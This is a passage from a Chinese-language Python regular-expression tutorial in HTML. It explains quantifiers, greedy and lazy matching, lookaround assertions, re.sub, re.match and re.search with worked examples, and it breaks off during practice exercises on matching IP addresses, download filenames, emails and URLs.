[<span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'a'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'b'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'c'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'w'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'z'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'c'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'o'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'&amp;'</span>, <span style="color: #8b2252;">'-'</span>, <span style="color: #8b2252;">'-'</span>]
[<span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'a'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'b'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'c'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'w'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'z'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'c'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'o'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'1'</span>, <span style="color: #8b2252;">'2'</span>, <span style="color: #8b2252;">'3'</span>, <span style="color: #8b2252;">'4'</span>, <span style="color: #8b2252;">'5'</span>, <span style="color: #8b2252;">'6'</span>, <span style="color: #8b2252;">'7'</span>, <span style="color: #8b2252;">'8'</span>, <span style="color: #8b2252;">'9'</span>]
[<span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'a'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'b'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'c'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'w'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'z'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'c'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'o'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'1'</span>, <span style="color: #8b2252;">'2'</span>, <span style="color: #8b2252;">'3'</span>, <span style="color: #8b2252;">'4'</span>, <span style="color: #8b2252;">'5'</span>, <span style="color: #8b2252;">'6'</span>, <span style="color: #8b2252;">'7'</span>, <span style="color: #8b2252;">'8'</span>, <span style="color: #8b2252;">'9'</span>]
</pre>
</div>
</div>
</div>
<div id="outline-container-h:fadae255-615c-4328-8549-08d349189d12" class="outline-4">
<h4 id="h:fadae255-615c-4328-8549-08d349189d12">数量词</h4>
<div class="outline-text-4" id="text-h:fadae255-615c-4328-8549-08d349189d12">
<p>
数量词的词法是：{min,max} 。min 和 max 都是非负整数。如果逗号有而 max 被忽略了，则 max 没有限制。如果逗号和 max 都被忽略了，则重复 min 次。比如， \b[1-9][0-9]{3}\b ,匹配的是 1000 ~ 9999 之间的数字(“\b” 表示单词边界），而 \b[1-9][0-9]{2,4}\b ，匹配的是一个在 100 ~ 99999 之间的数字。<br>
</p>

<p>
下面看一个实例，匹配出字符串中 4 到 7 个字母的英文<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> re

<span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">'java*&amp;39android##@@python'</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25968;&#37327;&#35789;</span>
<span style="color: #a0522d;">findall</span> = re.findall(<span style="color: #8b2252;">'[a-z]{4,7}'</span>, a)
<span style="color: #483d8b;">print</span>(findall)
</pre>
</div>

<p>
输出结果：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">[<span style="color: #8b2252;">'java'</span>, <span style="color: #8b2252;">'android'</span>, <span style="color: #8b2252;">'python'</span>]
</pre>
</div>

<p>
注意，这里有贪婪和非贪婪之分。那么我们先看下相关的概念：<br>
</p>
</div>
</div>
<div id="outline-container-h:c3569ef5-e746-45fd-b9bc-d17ad926a8c0" class="outline-4">
<h4 id="h:c3569ef5-e746-45fd-b9bc-d17ad926a8c0">贪婪与非贪婪</h4>
<div class="outline-text-4" id="text-h:c3569ef5-e746-45fd-b9bc-d17ad926a8c0">
<p>
贪婪与非贪婪模式影响的是被量词修饰的子表达式的匹配行为，贪婪模式在整个表达式匹配成功的前提下，尽可能多的匹配，而非贪婪模式在整个表达式匹配成功的前提下，尽可能少的匹配。<br>
</p>

<p>
上面例子中的就是贪婪的，如果要使用非贪婪，也就是懒惰模式，怎么用呢？<br>
</p>

<p>
如果要使用非贪婪，则加一个 ? ，上面的例子修改如下：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> re

<span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">'java*&amp;39android##@@python'</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#36138;&#23146;&#19982;&#38750;&#36138;&#23146;</span>
<span style="color: #a0522d;">re_findall</span> = re.findall(<span style="color: #8b2252;">'[a-z]{4,7}?'</span>, a)
<span style="color: #483d8b;">print</span>(re_findall)
</pre>
</div>

<p>
输出结果如下：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">[<span style="color: #8b2252;">'java'</span>, <span style="color: #8b2252;">'andr'</span>, <span style="color: #8b2252;">'pyth'</span>]
</pre>
</div>

<p>
从输出的结果可以看出，android 只打印除了 andr ，Python 只打印除了 pyth ，因为这里使用的是懒惰模式。<br>
</p>

<p>
当然，还有一些特殊字符也是可以表示数量的，比如：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">? &#65306;&#21578;&#35785;&#24341;&#25806;&#21305;&#37197;&#21069;&#23548;&#23383;&#31526; 0 &#27425;&#25110; 1 &#27425;
+ &#65306;&#21578;&#35785;&#24341;&#25806;&#21305;&#37197;&#21069;&#23548;&#23383;&#31526; 1 &#27425;&#25110;&#22810;&#27425;
* &#65306;&#21578;&#35785;&#24341;&#25806;&#21305;&#37197;&#21069;&#23548;&#23383;&#31526; 0 &#27425;&#25110;&#22810;&#27425;
</pre>
</div>

<p>
默认是贪婪模式，也就是说尽量多匹配更长的字符串。<br>
</p>

<p>
非贪婪很简单，在重复的符号后面加上一个?问号，就尽量的少匹配了。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#20195;&#30721; &#35828;&#26126; &#20030;&#20363;
*? &#21305;&#37197;&#20219;&#24847;&#27425;&#65292;&#20294;&#23613;&#21487;&#33021;&#23569;&#37325;&#22797; 
+? &#21305;&#37197;&#33267;&#23569;1&#27425;&#65292;&#65292;&#20294;&#23613;&#21487;&#33021;&#23569;&#37325;&#22797; 
?? &#21305;&#37197;0&#27425;&#25110;1&#27425;&#65292;&#65292;&#20294;&#23613;&#21487;&#33021;&#23569;&#37325;&#22797; 
{n,}? &#21305;&#37197;&#33267;&#23569;n&#27425;&#65292;&#20294;&#23613;&#21487;&#33021;&#23569;&#37325;&#22797; 
{n,m}? &#21305;&#37197;&#33267;&#23569;n&#27425;&#65292;&#33267;&#22810;m&#27425;&#65292;&#20294;&#23613;&#21487;&#33021;&#23569;&#37325;&#22797; 
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">very very happy &#20351;&#29992;v.*y&#21644;v.*?y
</pre>
</div>
</div>
</div>
<div id="outline-container-h:7701dccb-623f-4356-ae6e-4d3b4f222f0a" class="outline-4">
<h4 id="h:7701dccb-623f-4356-ae6e-4d3b4f222f0a">断言</h4>
<div class="outline-text-4" id="text-h:7701dccb-623f-4356-ae6e-4d3b4f222f0a">
<p>
"环视"锚定，即lookaround anchor，也称为”零宽断言”，它表示匹配的是位置，不是字符。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#38646;&#23485;&#26029;&#35328;</span>
<span style="color: #0000ff;">-</span> (?=exp)  &#20174;&#24038;&#21521;&#21491;&#30340;&#39034;&#24207;&#29615;&#35270;&#65292;&#21448;&#21483;&#38646;&#23485;&#24230;&#27491;&#39044;&#27979;&#20808;&#34892;&#26029;&#35328;&#12290;&#26029;&#35328;exp&#19968;&#23450;&#22312;&#21305;&#37197;&#30340;&#21491;&#36793;&#20986;&#29616;&#65292;&#20063;&#23601;&#26159;&#35828;&#26029;&#35328;&#21518;&#38754;&#19968;&#23450;&#36319;&#20010;exp
<span style="color: #0000ff;">-</span> (?&lt;=exp) &#20174;&#21491;&#21521;&#24038;&#30340;&#36870;&#24207;&#29615;&#35270;&#65292;&#21448;&#21483;&#38646;&#23485;&#24230;&#27491;&#22238;&#39038;&#21518;&#21457;&#26029;&#35328;&#12290;&#26029;&#35328;exp&#19968;&#23450;&#20986;&#29616;&#22312;&#21305;&#37197;&#30340;&#24038;&#36793;&#20986;&#29616;&#65292;&#20063;&#23601;&#26159;&#35828;&#21069;&#38754;&#19968;&#23450;&#26377;&#20010;exp&#21069;&#32512;

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36127;&#21521;&#38646;&#23485;&#26029;&#35328;</span>
<span style="color: #0000ff;">-</span> (?!exp) &#39034;&#24207;&#29615;&#35270;&#30340;&#21462;&#21453;&#65292;&#21448;&#21483;&#38646;&#23485;&#24230;&#36127;&#39044;&#27979;&#20808;&#34892;&#26029;&#35328;&#12290;&#26029;&#35328;exp&#19968;&#23450;&#19981;&#20250;&#20986;&#29616;&#22312;&#21491;&#20391;&#65292;&#20063;&#23601;&#26159;&#35828;&#26029;&#35328;&#21518;&#38754;&#19968;&#23450;&#19981;&#26159;exp
<span style="color: #0000ff;">-</span> (?&lt;!exp) &#36870;&#24207;&#29615;&#35270;&#30340;&#21462;&#21453;&#65292;&#21448;&#21483;&#38646;&#23485;&#24230;&#36127;&#22238;&#39038;&#21518;&#21457;&#26029;&#35328;&#12290;&#26029;&#35328;exp&#19968;&#23450;&#19981;&#33021;&#20986;&#29616;&#22312;&#24038;&#20391;&#65292;&#20063;&#23601;&#26159;&#35828;&#26029;&#35328;&#21069;&#38754;&#19968;&#23450;&#19981;&#33021;&#26159;exp
<span style="color: #0000ff;">-</span> (?#comment) &#27880;&#37322;
</pre>
</div>

<p>
关于”环视”锚定，最需要注意的一点是匹配的结果不占用任何字符，它仅仅只是锚定位置。所以断言只是个条件。<br>
</p>

<p>
另外，无论是哪种锚定，都是从左向右匹配再做回溯的(假设允许回溯)，即使是逆序环视。<br>
</p>


<p>
范例：测试字符串为wood took foot food<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#39034;&#24207;&#29615;&#35270;</span>
<span style="color: #0000ff;">f</span>(?=oo) <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21305;&#37197;f&#65292;&#20294;f&#21518;&#38754;&#19968;&#23450;&#26377;oo&#20986;&#29616;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#36870;&#24207;&#29615;&#35270;&#65292;&#36825;&#37324;&#33021;&#36870;&#24207;&#21305;&#37197;&#25104;&#21151;&#65292;&#38752;&#30340;&#26159;&#38170;&#23450;&#25324;&#21495;&#21518;&#38754;&#30340;ood\ook</span>
(?&lt;=f)ood <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21305;&#37197;ood&#65292;ook&#21069;&#19968;&#23450;&#26377;t&#20986;&#29616;</span>
(?&lt;=t)ook <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21305;&#37197;ook&#65292;ook&#21069;&#19968;&#23450;&#26377;t&#20986;&#29616;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#39034;&#24207;&#21542;&#23450;&#29615;&#35270;</span>
<span style="color: #0000ff;">foo</span>(?!d) <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21305;&#37197;foo&#65292;&#20294;foo&#21518;&#38754;&#19968;&#23450;&#19981;&#26159;d</span>
\d{3}(?!\d) <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21305;&#37197;3&#20301;&#25968;&#23383;&#65292;&#26029;&#35328;3&#20301;&#25968;&#23383;&#21518;&#38754;&#19968;&#23450;&#19981;&#33021;&#26159;&#25968;&#23383;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#36870;&#24207;&#21542;&#23450;&#29615;&#35270;</span>
(?&lt;!f)ood <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21305;&#37197;ood&#65292;&#20294;ood&#30340;&#24038;&#36793;&#19968;&#23450;&#19981;&#26159;f</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#27880;&#37322;</span>
<span style="color: #0000ff;">f</span>(?=oo)(?#&#36825;&#20010;&#21518;&#26029;&#35328;&#19981;&#25429;&#33719;)
</pre>
</div>


<p>
范例：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> re

<span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">'wood took foot food'</span>

<span style="color: #a0522d;">findall</span> = re.findall(<span style="color: #8b2252;">'f(?=oo)'</span>, a)
<span style="color: #483d8b;">print</span>(findall) <span style="color: #b22222;"># </span><span style="color: #b22222;">['f', 'f']</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:ecef667e-d8f5-474c-a7d9-46a45e8bf8ae" class="outline-4">
<h4 id="h:ecef667e-d8f5-474c-a7d9-46a45e8bf8ae">边界匹配符和组</h4>
<div class="outline-text-4" id="text-h:ecef667e-d8f5-474c-a7d9-46a45e8bf8ae">
<p>
将上面几个点，就用了很大的篇幅了，现在介绍一些边界匹配符和组的概念。<br>
</p>

<p>
一般的边界匹配符有以下几个：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#35821;&#27861; &#25551;&#36848;
^ &#21305;&#37197;&#23383;&#31526;&#20018;&#24320;&#22836;&#65288;&#22312;&#26377;&#22810;&#34892;&#30340;&#24773;&#20917;&#20013;&#21305;&#37197;&#27599;&#34892;&#30340;&#24320;&#22836;&#65289;
$ &#21305;&#37197;&#23383;&#31526;&#20018;&#30340;&#26411;&#23614;(&#22312;&#26377;&#22810;&#34892;&#30340;&#24773;&#20917;&#20013;&#21305;&#37197;&#27599;&#34892;&#30340;&#26411;&#23614;)
\A &#20165;&#21305;&#37197;&#23383;&#31526;&#20018;&#24320;&#22836;
\Z &#20165;&#21305;&#37197;&#23383;&#31526;&#20018;&#26411;&#23614;
\b &#21305;&#37197; \w &#21644; \W &#20043;&#38388;
\B [^\b]
</pre>
</div>

<p>
分组，被括号括起来的表达式就是分组。分组表达式 (&#x2026;) 其实就是把这部分字符作为一个整体，当然，可以有多分组的情况，每遇到一个分组，编号就会加 1 ，而且分组后面也是可以加数量词的。<br>
</p>
</div>
</div>
<div id="outline-container-h:43cc32c8-724c-452a-b72d-2ffcffa3c759" class="outline-4">
<h4 id="h:43cc32c8-724c-452a-b72d-2ffcffa3c759">re.sub</h4>
<div class="outline-text-4" id="text-h:43cc32c8-724c-452a-b72d-2ffcffa3c759">
<p>
实战过程中，我们很多时候需要替换字符串中的字符，这时候就可以用到 def sub(pattern, repl, string, count=0, flags=0) 函数了，re.sub 共有五个参数。其中三个必选参数：pattern, repl, string ; 两个可选参数：count, flags .<br>
</p>

<p>
具体参数意义如下：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#21442;&#25968; &#25551;&#36848;
pattern &#34920;&#31034;&#27491;&#21017;&#20013;&#30340;&#27169;&#24335;&#23383;&#31526;&#20018;
repl repl&#65292;&#23601;&#26159;replacement&#65292;&#34987;&#26367;&#25442;&#30340;&#23383;&#31526;&#20018;&#30340;&#24847;&#24605;
string &#21363;&#34920;&#31034;&#35201;&#34987;&#22788;&#29702;&#65292;&#35201;&#34987;&#26367;&#25442;&#30340;&#37027;&#20010; string &#23383;&#31526;&#20018;
count &#23545;&#20110;pattern&#20013;&#21305;&#37197;&#21040;&#30340;&#32467;&#26524;&#65292;count&#21487;&#20197;&#25511;&#21046;&#23545;&#21069;&#20960;&#20010;group&#36827;&#34892;&#26367;&#25442;
flags &#27491;&#21017;&#34920;&#36798;&#24335;&#20462;&#39280;&#31526;
</pre>
</div>

<p>
具体使用可以看下下面的这个实例，注释都写的很清楚的了，主要是注意一下，第二个参数是可以传递一个函数的，这也是这个方法的强大之处，例如例子里面的函数 convert ,对传递进来要替换的字符进行判断，替换成不同的字符。<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">!/usr/bin/env python3</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">-*- coding: UTF-8 -*-</span>

<span style="color: #a020f0;">import</span> re

<span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">'Python*Android*Java-888'</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25226;&#23383;&#31526;&#20018;&#20013;&#30340; * &#23383;&#31526;&#26367;&#25442;&#25104; &amp; &#23383;&#31526;</span>
<span style="color: #a0522d;">sub1</span> = re.sub(<span style="color: #8b2252;">'\*'</span>, <span style="color: #8b2252;">'&amp;'</span>, a)
<span style="color: #483d8b;">print</span>(sub1)

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25226;&#23383;&#31526;&#20018;&#20013;&#30340;&#31532;&#19968;&#20010; * &#23383;&#31526;&#26367;&#25442;&#25104; &amp; &#23383;&#31526;</span>
<span style="color: #a0522d;">sub2</span> = re.sub(<span style="color: #8b2252;">'\*'</span>, <span style="color: #8b2252;">'&amp;'</span>, a, 1)
<span style="color: #483d8b;">print</span>(sub2)

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25226;&#23383;&#31526;&#20018;&#20013;&#30340; * &#23383;&#31526;&#26367;&#25442;&#25104; &amp; &#23383;&#31526;,&#25226;&#23383;&#31526; - &#25442;&#25104; |</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">1&#12289;&#20808;&#23450;&#20041;&#19968;&#20010;&#20989;&#25968;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">convert</span>(value):
    <span style="color: #a0522d;">group</span> = value.group()
    <span style="color: #a020f0;">if</span> (group == <span style="color: #8b2252;">'*'</span>):
        <span style="color: #a020f0;">return</span> <span style="color: #8b2252;">'&amp;'</span>
    <span style="color: #a020f0;">elif</span> (group == <span style="color: #8b2252;">'-'</span>):
        <span style="color: #a020f0;">return</span> <span style="color: #8b2252;">'|'</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#31532;&#20108;&#20010;&#21442;&#25968;&#65292;&#35201;&#26367;&#25442;&#30340;&#23383;&#31526;&#21487;&#20197;&#20026;&#19968;&#20010;&#20989;&#25968;</span>
<span style="color: #a0522d;">sub3</span> = re.sub(<span style="color: #8b2252;">'[\*-]'</span>, convert, a)
<span style="color: #483d8b;">print</span>(sub3)
</pre>
</div>

<p>
输出的结果：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">Python&amp;Android&amp;Java-888
Python&amp;Android*Java-888
Python&amp;Android&amp;Java|888
</pre>
</div>
</div>
</div>
<div id="outline-container-h:fe4c8b10-1e02-4186-a131-e636df0324ba" class="outline-4">
<h4 id="h:fe4c8b10-1e02-4186-a131-e636df0324ba">re.match 和 re.search</h4>
<div class="outline-text-4" id="text-h:fe4c8b10-1e02-4186-a131-e636df0324ba">
<p>
<b>re.match 函数</b><br>
</p>

<p>
语法：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">re.match</span>(pattern, string, <span style="color: #a0522d;">flags</span>=0)
</pre>
</div>


<p>
re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match() 就返回 none。<br>
</p>
<div class="org-src-container">
<pre class="src src-python">
<span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">'Python*Android*Java-888'</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992; re.match</span>
<span style="color: #a020f0;">match</span> = re.<span style="color: #a020f0;">match</span>(<span style="color: #8b2252;">'[a-zA-Z]{4,7}'</span>, a)
<span style="color: #b22222;"># </span><span style="color: #b22222;">group(0) &#26159;&#19968;&#20010;&#23436;&#25972;&#30340;&#20998;&#32452;</span>
<span style="color: #483d8b;">print</span>(<span style="color: #a020f0;">match</span>.group(0)) <span style="color: #b22222;">#</span><span style="color: #b22222;">Python</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#38480;&#21046;&#21305;&#37197;&#38271;&#24230;&#20026; 7</span>
<span style="color: #a020f0;">match</span> = re.<span style="color: #a020f0;">match</span>(<span style="color: #8b2252;">'[a-zA-Z]{7}'</span>, a)
<span style="color: #483d8b;">print</span>(<span style="color: #a020f0;">match</span>.group(0)) <span style="color: #b22222;">#</span><span style="color: #b22222;">&#25253;&#38169;&#65292;&#27809;&#26377;&#20174;&#36215;&#22987;&#20301;&#32622;7&#20301;&#30340;&#23383;&#31526;&#20018;</span>
</pre>
</div>

<p>
<b>re.search 函数</b><br>
</p>

<p>
语法：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">re.search</span>(pattern, string, <span style="color: #a0522d;">flags</span>=0)
</pre>
</div>

<p>
re.search 扫描整个字符串并返回第一个成功的匹配。<br>
re.match 和 re.search 的参数，基本一致的，具体描述如下：<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#21442;&#25968; &#25551;&#36848;
pattern &#21305;&#37197;&#30340;&#27491;&#21017;&#34920;&#36798;&#24335;
string &#35201;&#21305;&#37197;&#30340;&#23383;&#31526;&#20018;
flags &#26631;&#24535;&#20301;&#65292;&#29992;&#20110;&#25511;&#21046;&#27491;&#21017;&#34920;&#36798;&#24335;&#30340;&#21305;&#37197;&#26041;&#24335;&#65292;&#22914;&#65306;&#26159;&#21542;&#21306;&#20998;&#22823;&#23567;&#20889;
</pre>
</div>

<p>
那么它们之间有什么区别呢？<br>
</p>

<p>
re.match 只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回 None；而 re.search匹配整个字符串，直到找到一个匹配。这就是它们之间的区别了。<br>
</p>

<p>
可能在个人的使用中，可能更多的还是使用 re.findall<br>
</p>

<p>
看下下面的实例，可以对比下 re.search 和 re.findall 的区别，还有多分组的使用。具体看下注释，对比一下输出的结果：<br>
</p>

<p>
示例：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">!/usr/bin/env python3</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">-*- coding: UTF-8 -*-</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25552;&#21462;&#22270;&#29255;&#30340;&#22320;&#22336;</span>

<span style="color: #a020f0;">import</span> re
<span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">'&lt;img src="https://www.cici.com/a8c49ef606e0e1f3ee28932usk89105e.jpg"&gt;'</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992; re.search</span>
<span style="color: #a0522d;">search</span> = re.search(<span style="color: #8b2252;">'&lt;img src="(.*)"&gt;'</span>, a)
<span style="color: #b22222;"># </span><span style="color: #b22222;">group(0) &#26159;&#19968;&#20010;&#23436;&#25972;&#30340;&#20998;&#32452;</span>
<span style="color: #483d8b;">print</span>(search.group(0))
<span style="color: #483d8b;">print</span>(search.group(1))

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992; re.findall</span>
<span style="color: #a0522d;">findall</span> = re.findall(<span style="color: #8b2252;">'&lt;img src="(.*)"&gt;'</span>, a)
<span style="color: #483d8b;">print</span>(findall)

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#22810;&#20010;&#20998;&#32452;&#30340;&#20351;&#29992;&#65288;&#27604;&#22914;&#25105;&#20204;&#38656;&#35201;&#25552;&#21462; img &#23383;&#27573;&#21644;&#22270;&#29255;&#22320;&#22336;&#23383;&#27573;&#65289;</span>
<span style="color: #a0522d;">re_search</span> = re.search(<span style="color: #8b2252;">'&lt;(.*) src="(.*)"&gt;'</span>, a)
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25171;&#21360; img</span>
<span style="color: #483d8b;">print</span>(re_search.group(1))
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25171;&#21360;&#22270;&#29255;&#22320;&#22336;</span>
<span style="color: #483d8b;">print</span>(re_search.group(2))
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25171;&#21360; img &#21644;&#22270;&#29255;&#22320;&#22336;&#65292;&#20197;&#20803;&#31062;&#30340;&#24418;&#24335;</span>
<span style="color: #483d8b;">print</span>(re_search.group(1, 2)) <span style="color: #b22222;">#</span><span style="color: #b22222;">('img', 'https://www.cici.com/a8c49ef606e0e1f3ee28932usk89105e.jpg')</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25110;&#32773;&#20351;&#29992; groups</span>
<span style="color: #483d8b;">print</span>(re_search.groups())
</pre>
</div>

<p>
输出的结果：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;img <span style="color: #a0522d;">src</span>=<span style="color: #8b2252;">"https://www.cici.com/a8c49ef606e0e1f3ee28932usk89105e.jpg"</span>&gt;
https://www.cici.com/a8c49ef606e0e1f3ee28932usk89105e.jpg
[<span style="color: #8b2252;">'https://www.cici.com/a8c49ef606e0e1f3ee28932usk89105e.jpg'</span>]
img
https://www.cici.com/a8c49ef606e0e1f3ee28932usk89105e.jpg
(<span style="color: #8b2252;">'img'</span>, <span style="color: #8b2252;">'https://www.cici.com/a8c49ef606e0e1f3ee28932usk89105e.jpg'</span>)
(<span style="color: #8b2252;">'img'</span>, <span style="color: #8b2252;">'https://www.cici.com/a8c49ef606e0e1f3ee28932usk89105e.jpg'</span>)
</pre>
</div>
</div>
</div>
<div id="outline-container-h:0c0faeaa-364a-4303-ab1e-9cf4fd749d12" class="outline-4">
<h4 id="h:0c0faeaa-364a-4303-ab1e-9cf4fd749d12">正则习题</h4>
<div class="outline-text-4" id="text-h:0c0faeaa-364a-4303-ab1e-9cf4fd749d12">
<p>
<b>IP地址</b><br>
</p>

<p>
匹配合法的IP地址<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">192.168.1.150
0.0.0.0
255.255.255.255
17.16.52.100
172.16.0.100
400.400.999.888
001.022.003.000
257.257.255.256
</pre>
</div>

<p>
<b>提取文件名</b><br>
</p>

<p>
选出含有ftp的链接，且文件类型是gz或者xz的文件名<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">ftp://ftp.astron.com/pub/file/file-5.14.tar.gz
ftp://ftp.gmplib.org/pub/gmp-5.1.2/gmp-5.1.2.tar.xz
ftp://ftp.vim.org/pub/vim/unix/vim-7.3.tar.bz2
http://anduin.linuxfromscratch.org/sources/LFS/lfs-packages/conglomeration//iana-etc/iana-etc-2.30.tar.bz2
http://anduin.linuxfromscratch.org/sources/other/udev-lfs-205-1.tar.bz2
http://download.savannah.gnu.org/releases/libpipeline/libpipeline-1.2.4.tar.gz
http://download.savannah.gnu.org/releases/man-db/man-db-2.6.5.tar.xz
http://download.savannah.gnu.org/releases/sysvinit/sysvinit-2.88dsf.tar.bz2
http://ftp.altlinux.org/pub/people/legion/kbd/kbd-1.15.5.tar.gz
http://mirror.hust.edu.cn/gnu/autoconf/autoconf-2.69.tar.xz
http://mirror.hust.edu.cn/gnu/automake/automake-1.14.tar.xz
</pre>
</div>

<p>
<b>匹配邮箱地址</b><br>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">test</span>@hot-mail.com
v-ip@cici.com
web.manager@cici.com.cn
super.user@google.com
a@w-a-com
</pre>
</div>

<p>
<b>匹配html标记</b><br>
</p>

<p>
提取href中的链接url，提取文字“CiCi”<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;a <span style="color: #a0522d;">href</span>=<span style="color: #8b2252;">'http://www.cici.com/index.html'</span> <span style="color: #a0522d;">target</span>=<span style="color: #8b2252;">'_blank'</span>&gt;CiCi&lt;/a&gt;
</pre>
</div>

<p>
<b>匹配URL</b><br>
</p>

<div class="org-src-container">
<pre class="src src-sh">http://www.cici.com/index.html
https://login.cici.com
file:///ect/sysconfig/network
</pre>
</div>

<p>
<b>匹配二代中国身份证ID</b><br>
</p>

<div class="org-src-container">
